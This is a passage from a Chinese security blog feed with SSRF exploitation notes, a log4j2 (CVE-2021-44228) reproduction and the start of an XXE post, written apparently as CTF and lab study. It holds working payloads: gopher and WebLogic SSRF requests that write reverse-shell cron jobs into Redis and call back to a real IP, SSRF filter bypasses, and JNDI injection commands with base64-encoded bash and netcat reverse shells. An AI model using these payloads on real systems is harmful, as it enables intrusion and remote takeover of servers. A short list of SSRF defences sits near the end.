协议可以读取任意内容<br> （2）<code>dict</code>：泄露安装软件版本信息，查看端口，操作内网redis服务等<br> （3）<code>gopher</code>：gopher支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell<br> （4）<code>http/s</code>：探测内网主机存活</p><h1 id="SSRF漏洞利用"><a href="#SSRF漏洞利用" class="headerlink" title="SSRF漏洞利用"></a>SSRF漏洞利用</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>攻击机:kali、远程vps</p><p>目标机:阿里云</p><p>docker镜像：ssrf_redis</p><p>PHP版本：PHP Version 7.2.28(5.6版本测试会失败)</p><p>这里我直接使用宝塔来搭建靶机，注意，需要关闭open_basedir，否则会导致file协议失效</p><p><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220424204936132.png" alt="image-20220424204936132"></p><h2 id="远程利用示例代码"><a href="#远程利用示例代码" class="headerlink" title="远程利用示例代码"></a>远程利用示例代码</h2><p>ssrf.php</p><pre><code class="php">&lt;?php$ch = curl_init(); //创建新的 cURL 资源curl_setopt($ch, CURLOPT_URL, $_GET[&#39;url&#39;]); //设置URL 和相应的选项#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_HEADER, 0);#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);curl_exec($ch); //抓取 URL 内容并把它传递给浏览器，存储进文件curl_close($ch); ////关闭 cURL 资源，并且释放系统资源?&gt;</code></pre><p>post.php</p><pre><code class="php">&lt;html&gt;&lt;head&gt;    &lt;title&gt;post&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;?php    echo $_REQUEST[cmd];    ?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h2 id="远程利用方式"><a href="#远程利用方式" class="headerlink" title="远程利用方式"></a>远程利用方式</h2><p><strong>1.利用file协议读取</strong></p><pre><code>http://39.xx.xx.xx:66/ssrf.php?url=file:///etc/passwd</code></pre><p><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220424210730715.png" alt="image-20220424210730715"></p><p>一般探测内网会读一下:</p><pre><code>http://39.xx.xx.xx:66/ssrf.php?url=file:///proc/net/arp</code></pre><p><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220424211134080.png" alt="image-20220424211134080"></p><p><strong>2.利用dict协议</strong></p><p>（1）查看端口及端口上运行服务的版本信息</p><pre><code>http://39.x.x.x:8000/ssrf.php?url=dict://127.0.0.1:22/</code></pre><p><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220424211349497.png" alt="image-20220424211349497"></p><p>（2）通过dict协议getshell</p><p>有关dict协议：向服务器的端口请求 命令:参数，并在末尾自动补上<code>\r\n</code>(CRLF)<br>                          dict协议要一条一条的执行，而gopher协议执行一条命令就行了</p><p><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095631-af0958b4-6d72-1.jpg" alt="img"></p><p><strong>3.利用gopher协议</strong></p><p>  (1)攻击内网redis并反弹shell</p><p>利用redis未授权访问攻击redis<br> <code>攻击redis的exp</code></p><p>shell.sh</p><pre><code>echo -e &quot;\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/108.166.201.16/4444 0&gt;&amp;1\n\n\n&quot;|redis-cli -h $1 -p $2 -x set 1redis-cli -h $1 -p $2 config set dir /var/spool/cron/redis-cli -h $1 -p $2 config set dbfilename rootredis-cli -h $1 -p $2 saveredis-cli -h $1 -p $2 quit</code></pre><p>使用这个exp随意一个目标，捕获到数据</p><pre><code>bash shell.sh 39.x.x.x 6379</code></pre><p>再对数据进行一些转换</p><p> 转换规则：<br> 如果第一个字符是<code>&gt;</code>或者<code>&lt;</code>那么丢弃该行字符串，表示请求和返回的时间。<br> 如果前3个字符是+OK 那么丢弃该行字符串，表示返回的字符串。<br> 将<code>\r</code>字符串替换成<code>%0d%0a</code><br> 空白行替换为<code>%0a</code></p><p>结合gopher协议攻击内网redis，使用上边捕获数据的转换结果即可，然后进行反弹shell：</p><pre><code>curl -v &#39;http://39.105.71.63:66/ssrf.php?url=gopher://127.0.0.1:6379/_*1%250d%250a%248%250d%250aflushall%250d%250a%2a3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2464%250d%250a%250d%250a%250a%250a%2a%2f1%20%2a%20%2a%20%2a%20%2a%20bash%20-i%20%3E%26%20%2fdev%2ftcp%2f108.166.201.16%2f4444%200%3E%261%250a%250a%250a%250a%250a%250d%250a%250d%250a%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2fvar%2fspool%2fcron%2f%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2a1%250d%250a%244%250d%250asave%250d%250aquit%250d%250a&#39;</code></pre><p><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095632-af32d162-6d72-1.jpg" alt="img"></p><p><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095632-af5bb41a-6d72-1.jpg" alt="img"></p><p>诶，搞这个redis老是把我服务器搞崩，我就不复现了。</p><p>（2）伪造post请求反弹shell</p><pre><code>curl -v &#39;http://39.x.x.x:8000/ssrf.php?url=gopher://192.168.1.5:80/_POST%20/post.php%20HTTP/1.1%250d%250aHost:%2039.105.93.165%250d%250aUser-Agent:%20curl/7.58.0%250d%250aAccept:%20*/*%250d%250aContent-Type:%20application/x-www-form-urlencoded%250d%250a%250d%250acmd%3Dccccc%250d%250a%250d%250abash%20-i%20%3E%26%20%2fdev%2ftcp%2f121.36.67.230%2f4444%200%3E%261&#39;</code></pre><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200324095632-af8614a8-6d72-1.jpg"><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095632-af8614a8-6d72-1.jpg" alt="img"></a><br> <a href="https://xzfile.aliyuncs.com/media/upload/picture/20200324095632-afabc5e0-6d72-1.jpg"><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095632-afabc5e0-6d72-1.jpg" alt="img"></a><br> 反弹成功<br> <code>192.168.1.5</code>是内网Web服务，有post.php</p><p><strong>4 .利用<code>http/s</code>协议</strong><br> 探测内网主机存活</p><p><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095633-aff15a38-6d72-1.jpg" alt="img"></p><p>说明内网ip为<code>192.168.1.3</code>的主机存活</p><h1 id="SSRF应用攻击实战"><a href="#SSRF应用攻击实战" class="headerlink" title="SSRF应用攻击实战"></a>SSRF应用攻击实战</h1><h2 id="1、gopher攻击redis"><a href="#1、gopher攻击redis" class="headerlink" title="1、gopher攻击redis"></a><strong>1、gopher攻击redis</strong></h2><p>参考<strong>远程利用 3.利用<code>gopher</code>协议</strong></p><h2 id="2、weblogic-ssrf攻击redis"><a href="#2、weblogic-ssrf攻击redis" class="headerlink" title="2、weblogic ssrf攻击redis"></a><strong>2、weblogic ssrf攻击redis</strong></h2><p>下载地址：<a href="https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf">https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf</a><br> 编译并启动环境</p><pre><code>docker-compose builddocker-compose up -d</code></pre><p>SSRF漏洞存在于<code>http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp</code></p><p> <strong>1.查看端口</strong><br> 访问</p><pre><code>/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:80//测试http://127.0.0.1:7001：将80替换成7001</code></pre><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200324095633-b02c20b4-6d72-1.jpg"><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095633-b02c20b4-6d72-1.jpg" alt="img"></a><br> not connect，说明80端口未开放<br> <a href="https://xzfile.aliyuncs.com/media/upload/picture/20200324095634-b05a47d2-6d72-1.jpg"><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095634-b05a47d2-6d72-1.jpg" alt="img"></a><br> 返回404，说明端口开放<br> <strong>2.探测内网主机存活</strong><br> <a href="https://xzfile.aliyuncs.com/media/upload/picture/20200324095634-b09834c0-6d72-1.jpg"><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095634-b09834c0-6d72-1.jpg" alt="img"></a><br> 说明内网ip为<code>192.168.1.1</code>的主机存活<br> <strong>3.注入HTTP头，利用Redis反弹shell</strong><br> 通过ssrf探测内网中的redis服务器，发现172.22.0.2:6379可以连通<br> 和上边的远程利用几乎一样。<br> <a href="https://xzfile.aliyuncs.com/media/upload/picture/20200324095634-b0c0075c-6d72-1.jpg"><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095634-b0c0075c-6d72-1.jpg" alt="img"></a><br> 将反弹shell脚本写入/etc/crontab定时任务</p><pre><code>set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/121.36.67.230/4444 0&gt;&amp;1\n\n\n\n&quot;config set dir /etc/config set dbfilename crontabsave</code></pre><p>进行url编码</p><pre><code>test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F121.36.67.230%2F4444%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa</code></pre><p>换行符是“\r\n”换成“%0D%0A”。将url编码后的字符串放在ssrf的域名后面，发送<br> <a href="https://xzfile.aliyuncs.com/media/upload/picture/20200324095635-b0fc12ec-6d72-1.jpg"><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095635-b0fc12ec-6d72-1.jpg" alt="img"></a><br> 反弹成功<br> <a href="https://xzfile.aliyuncs.com/media/upload/picture/20200324095635-b1233318-6d72-1.jpg"><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095635-b1233318-6d72-1.jpg" alt="img"></a></p><h1 id="SSRF漏洞相关绕过"><a href="#SSRF漏洞相关绕过" class="headerlink" title="SSRF漏洞相关绕过"></a>SSRF漏洞相关绕过</h1><h2 id="1、常用绕过方法"><a href="#1、常用绕过方法" class="headerlink" title="1、常用绕过方法"></a><strong>1、常用绕过方法</strong></h2><p><strong>1.@</strong></p><pre><code>http://abc@127.0.0.1实际上是以用户名abc连接到站点127.0.0.1，同理http://8.8.8.8@127.0.0.1:8080、http://127.0.0.1#8.8.8.8</code></pre><p>在对@解析域名中，不同的处理函数存在处理差异，如：<br> <code>http://www.aaa.com@www.bbb.com@www.ccc.com</code><br> 在PHP的<code>parse_url</code>中会识别<a href="http://www.ccc.com,而`libcur`l则识别为www.bbb.com/">www.ccc.com，而`libcur`l则识别为www.bbb.com</a><br> <strong>2.利用[::]</strong><br> 可以利用<code>[::]</code>来绕过localhost</p><pre><code>http://[::]:80/  &gt;&gt;&gt;  http://127.0.0.1</code></pre><p><strong>3.添加端口号</strong></p><pre><code>http://127.0.0.1:8080</code></pre><p><strong>4.利用短网址</strong><br> <a href="http://tool.chinaz.com/tools/dwz.aspx">站长工具短网址</a><br> <a href="http://dwz.cn/">百度短网址</a><br> <strong>5.利用特殊域名</strong><br> 原理是DNS解析。xip.io可以指向任意域名，即</p><pre><code>127.0.0.1.xip.io，可解析为127.0.0.1</code></pre><p><strong>6.利用DNS解析</strong><br> 在域名上设置A记录，指向127.0.1<br> <strong>7.利用进制转换</strong></p><blockquote><p>127.0.0.1<br> 八进制：0177.0.0.1<br> 十六进制：0x7f.0.0.1<br> 十进制：2130706433</p></blockquote><p><strong>8.句号</strong></p><pre><code>127。0。0。1  &gt;&gt;&gt;  127.0.0.1</code></pre><p><strong>9.302跳转</strong><br> 使用<a href="https://tinyurl.com生成302跳转地址/">https://tinyurl.com生成302跳转地址</a></p><h2 id="2、常见限制"><a href="#2、常见限制" class="headerlink" title="2、常见限制"></a>2、常见限制</h2><p><strong>1.限制为<a href="http://www.xxx.com/">http://www.xxx.com</a> 域名</strong><br> 采用http基本身份认证的方式绕过。即@<br> <code>http://www.xxx.com@www.xxc.com</code><br> <strong>2.限制请求IP不为内网地址</strong><br> 当不允许ip为内网地址时<br> （1）采取短网址绕过<br> （2）采取特殊域名<br> （3）采取进制转换<br> <strong>3.限制请求只为http协议</strong><br> （1）采取302跳转<br> （2）采取短地址</p><h1 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h1><h2 id="file协议读不出文件"><a href="#file协议读不出文件" class="headerlink" title="file协议读不出文件"></a>file协议读不出文件</h2><p><strong>1、权限不够：</strong>当前用户对此文件没有可读权限</p><p><strong>2、路径输错了：</strong>linux系统中，file之后加路径是三个斜线，不能少：比如file:///etc/passwd（其实就是file://和/etc/passwd的组合）</p><p><strong>3、存在open_basedir：</strong>当open_basedir配置有值时，curl_exec不能使用file协议，并不是受open_basedir的值限制某些文件读不了，而是整个file协议都不能用。这是写在php的curl_exec源码里的，目前没找到绕过的方式。</p><p><img src="SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/imgpxy.phpurl=gnp=tmf_xw?046/ggmKrbiSh4fnScisOQkEciAqDHuDaiP4O9yu4IKOIoGIQOcJsNSvHK2ZHqk2EDyWEE0URtdEaiMUsdzaihmE7VJTI3bU/gnp_zibmm/nc.cipq.zibmm//:sptth" alt="img"></p><p><strong>4、php源码不显示：</strong>读取php源码，即使读成功了也不会在浏览器里回显（类似html的注释一样），要在返回包里或者view-source中去看。</p><p><img src="SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/imgpxy.phpurl=gnp=tmf_xw?046/AVOy6sdVuBHuoZ3dYmxMwTBApWe0dmkwyeSQcppVaiav5oIkWuzgY0Ek2EDyWEE0URtdEaiMUsdzaihmE7VJTI3bU/gnp_zibmm/nc.cipq.zibmm//:sptth" alt="img"></p><p><strong>5、不回显的ssrf：</strong>代码没写echo，返回值赋到变量里，读成功了你也看不到。</p><h2 id="gopher协议和dict协议发不出包"><a href="#gopher协议和dict协议发不出包" class="headerlink" title="gopher协议和dict协议发不出包"></a>gopher协议和dict协议发不出包</h2><p>自己在虚拟机搭的测试环境有一个很奇怪的现象，http/s和file协议都能正常使用，但是<strong>不能指定端口</strong>及<strong>使用gopher和dict协议</strong>，否则就只能发出dns请求，却不能建立tcp的连接（dnslog可以收到请求，nc收不到）。</p><p>后面查阅了很多资料，并没有找到明确的答案，只有一个疑似可能的原因：php在编译时没有使用**-with-curlwrappers**参数会导致这个问题。不过这个参数貌似在高版本被去掉了，所以应该只影响低版本php吧。</p><p>在实战中如果遇到这个问题，总不能登目标机器把php重新编译一下吧……（动作太大了，而且都能登机器了还要ssrf有什么用呢），目前没找到什么办法绕过。</p><h2 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h2><p>测试一下各协议对特殊符号的支持，中文符号不测试，测试的所有符号如下：</p><p>`~!@#$%^&amp;*()_-+=/|&#39;“;:&lt;&gt;,.?{}[]</p><p><strong>【gopher协议】</strong></p><p><strong>正常符号：</strong>直接传，一次二次url编码都可以</p><p><strong>%</strong> 直接传可以，但后面接16进制字符就会转义，一次url编码后还是不能接16进制，二次url编码可以</p><p><strong>#</strong> 会截断，一次url编码绕不过，二次url编码后可以</p><p><strong>&amp;</strong> 会截断，一次url编码可以，二次url编码也可以</p><p><strong>+</strong> 会变成空格，一次二次url编码后都可以</p><p><strong>【dict协议】</strong></p><p><strong>正常符号：</strong>直接传，一次url编码可以，二次url编码不行（不支持二次解码）</p><p>以下均不支持二次url解码</p><p><strong>%</strong> 直接传可以，后面接16进制不行会转义，一次url编码后可以</p><p><strong>#</strong> 会截断，一次url编码绕不过</p><p><strong>&amp;</strong> 会截断，一次url编码可以</p><p><strong>?</strong> 会截断，一次url编码绕不过</p><p><strong>+</strong> 会变成空格，一次url编码可以</p><p><strong>:</strong> 会变成空格，一次url编码绕不过</p><p><strong>【http/s协议】</strong></p><p><strong>正常符号：</strong>直接传，一次url编码可以，二次url编码不行（不支持二次解码）</p><p>以下均不支持二次url解码</p><p><strong>%</strong> 直接传可以，后面接16进制不行会转义，一次url编码后可以</p><p><strong>#</strong> 会截断，一次url编码绕不过</p><p><strong>&amp;</strong> 会截断，一次url编码可以</p><p><strong>+</strong> 会变成空格，一次url编码可以</p><p><strong>【总结】</strong></p><p>**%#&amp;+**符号容易出问题</p><p><strong>dict协议</strong>额外不支持**?:**两个符号，url编码无法绕过</p><p><strong>一次url编码</strong>可以绕过**%&amp;+<strong>三种符号，不能绕过</strong>#**</p><p>**gopher协议的%**需要编码两次绕过，只一次不行</p><p><strong>gopher</strong>万能协议，<strong>支持二次url解码</strong>，没有绕不过的特殊符号。</p><h1 id="SSRF漏洞防御"><a href="#SSRF漏洞防御" class="headerlink" title="SSRF漏洞防御"></a>SSRF漏洞防御</h1><p>1、禁用不需要的协议(如：<code>file:///</code>、<code>gopher://</code>,<code>dict://</code>等)。仅仅允许http和https请求<br> 2、统一错误信息，防止根据错误信息判断端口状态<br> 3、禁止302跳转，或每次跳转，都检查新的Host是否是内网IP，直到抵达最后的网址<br> 4、设置URL白名单或者限制内网IP</p><p>参考:</p><p><a href="http://www.hackdig.com/07/hack-419420.htm">http://www.hackdig.com/07/hack-419420.htm</a></p><p><a href="https://xz.aliyun.com/t/7405#toc-2">https://xz.aliyun.com/t/7405#toc-2</a></p><p>后面我摆烂了，服务器老是坏，等有时间继续复现把，先抄下大佬的文章。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近碰到了挺多SSRF题目的应用，以前学的太浅了，重新学习下，打好基础。&lt;/p&gt;
&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;SSRF漏洞简介&quot;&gt;&lt;a href=&quot;#SSRF漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;SSRF漏洞简介&quot;&gt;&lt;/a&gt;SSRF漏</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="常见漏洞和手法" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%89%8B%E6%B3%95/"/>
    
    
    <category term="SSRF" scheme="https://sakurahack-y.github.io/tags/SSRF/"/>
    
  </entry>
  
  <entry>
    <title>log4j2的简单复现</title>
    <link href="https://sakurahack-y.github.io/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/"/>
    <id>https://sakurahack-y.github.io/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-04-23T14:46:44.000Z</published>
    <updated>2022-04-23T16:33:05.602Z</updated>
    
    <content type="html"><![CDATA[<p>之前只是简略看了看这个漏洞，但是并没有及时复现，但是发现这个漏洞hw问的很多，所以还是及时复现一下吧。</p><h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p><a href="https://logging.apache.org/log4j/2.x/index.html">Apache Log4j2</a> 是 Apache 软件基金会下的一个<a href="https://github.com/apache/logging-log4j2">开源</a>的基于 Java 的日志记录工具。Log4j2 是一个 Log4j 1.x 的重写，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。由于其优异的性能而被广泛的应用于各种常见的 Web 服务中。</p><p>2021 年 12 月 9 日晚，Log4j2 的一个远程代码执行漏洞的利用细节被公开。攻击者使用 <code>$&#123;&#125;</code> 关键标识符触发 JNDI 注入漏洞，当程序将用户输入的数据进行日志记录时，即可触发此漏洞，成功利用此漏洞可以在目标服务器上执行任意代码。</p><p>漏洞编号：<a href="https://www.cve.org/CVERecord?id=CVE-2021-44228">CVE-2021-44228</a></p><p>- 漏洞：Log4j2 的 JNDI 功能点无法防御来自攻击者的 ldap 以及其他相关端点的攻击行为。<br>- 严重等级：Critical<br>- Basic CVSS 评分：10.0 CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H<br>- 影响版本：all versions from 2.0-beta9 to 2.14.1</p><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>由于本人代码功底有限，就大概说明下，不进行代码跟进了。</p><p>log4j2提供了一种叫<code>lookups</code>的功能来写日志</p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/webp.webp" alt="img"></p><p>而漏洞成因就是log4j2支持<code>Jndi Lookup</code></p><p>日志中包含 <code>$&#123;&#125;</code>,lookup功能就会将表达式的内容替换为表达式解析后的内容，而不是表达式本身。log4j 2将基本的解析都做了实现：</p><p><img src="https://upload-images.jianshu.io/upload_images/27307869-0dd3def6ff8e3f96.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/976/format/webp" alt="img"></p><p>常见解析：</p><pre><code>$&#123;ctx:loginId&#125;$&#123;map:type&#125;$&#123;filename&#125;$&#123;date:MM-dd-yyyy&#125;$&#123;docker:containerId&#125;$&#123;docker:containerName&#125;$&#123;docker:imageName&#125;$&#123;env:USER&#125;$&#123;event:Marker&#125;$&#123;mdc:UserId&#125;$&#123;java&#125;$&#123;jndi:logging/context-name&#125;$&#123;hostName&#125;$&#123;docker:containerId&#125;$&#123;k8s&#125;$&#123;log4j&#125;$&#123;main&#125;$&#123;name&#125;$&#123;marker&#125;$&#123;spring&#125;$&#123;sys:logPath&#125;$&#123;web:rootDir&#125;</code></pre><p>JNDI就是提供一个目录系统，并将服务与对象关联起来，可以使用名称来访问对象。而log4j 2中JNDI解析未作限制，可以直接访问到远程对象,如果是自己的服务器还好说，那如果访问到黑客的服务器呢？</p><p>也就是当记录日志的一部分是用户可控时(比如输入用户名和密码时)，就可以构造恶意字符串使服务器记录日志时调用JNDI访问恶意对象，也就是流传出的payload构成：</p><p>${jndi:ldap:xxx.xxx.xxx.xxx:xxxx/exp}</p><h1 id="复现流程"><a href="#复现流程" class="headerlink" title="复现流程"></a>复现流程</h1><p><strong>环境1 失败</strong></p><p>环境:<a href="http://vulfocus.io/">http://vulfocus.io/</a></p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220423225000889.png" alt="image-20220423225000889"></p><p>测试一下是否存在log4j2,使用网站:<a href="http://dnslog.cn/">http://dnslog.cn/</a></p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220423230017138.png" alt="image-20220423230017138"></p><pre><code>xxxx?payload=$&#123;jndi:ldap://37zwcc.dnslog.cn/exp&#125;</code></pre><p>有个很重要一点，要对特殊字符进行url编码</p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220423225440706.png" alt="image-20220423225440706"></p><p>成功回显，证明有漏洞</p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220423230128737.png" alt="image-20220423230128737"></p><p>在vps上运行jndi注入工具:</p><p>链接:<a href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220423230550825.png" alt="image-20220423230550825"></p><pre><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDguMTY2LjIwMS4xNi82NjY3IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A &quot;108.166.xx.xx&quot;</code></pre><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220423231525347.png" alt="image-20220423231525347"></p><p>nc监听:</p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220423231620210.png" alt="image-20220423231620210"></p><p>构造payload</p><pre><code>$&#123;jndi:rmi://108.166.201.16:1099/xodh7q&#125;</code></pre><p>还是进行url编码</p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220424000703924.png" alt="image-20220424000703924"></p><p>按理说就可以了，但是我在这个环境并没有成功</p><p><strong>环境2 成功</strong></p><p>感觉上面的环境有点问题，一直无法反弹shell，无论是bin/bash 还是nc都反弹失败了，下面采用bugku环境复现</p><p>url:<a href="https://ctf.bugku.com/challenges/detail/id/340.html">https://ctf.bugku.com/challenges/detail/id/340.html</a></p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220424000909413.png" alt="image-20220424000909413"></p><p>打一下poc，测试下是否存在漏洞</p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220424001013346.png" alt="image-20220424001013346"></p><p>ojbk，回显了</p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220424001036572.png" alt="image-20220424001036572"></p><p>在Linux上启动服务</p><pre><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;nc 108.166.xx.xx 4444 -e /bin/sh&quot; -A 108.166.xx.xx</code></pre><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220424001128315.png" alt="image-20220424001128315"></p><p>直接构造payload</p><pre><code>$&#123;jndi:rmi://108.166.201.16:1099/dwqsay&#125;</code></pre><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220424000441276.png" alt="image-20220424000441276"></p><p>成功反弹shell</p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220424000428361.png" alt="image-20220424000428361"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;之前只是简略看了看这个漏洞，但是并没有及时复现，但是发现这个漏洞hw问的很多，所以还是及时复现一下吧。&lt;/p&gt;
&lt;h1 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述&quot;&gt;&lt;/a&gt;漏洞描述&lt;/h1&gt;&lt;p&gt;&lt;a </summary>
      
    
    
    
    <category term="网络安全" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞复现" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="log4j2" scheme="https://sakurahack-y.github.io/tags/log4j2/"/>
    
  </entry>
  
  <entry>
    <title>XXE漏洞学习</title>
    <link href="https://sakurahack-y.github.io/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <id>https://sakurahack-y.github.io/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-04-19T15:00:37.000Z</published>
    <updated>2022-04-21T19:18:52.365Z</updated>
    
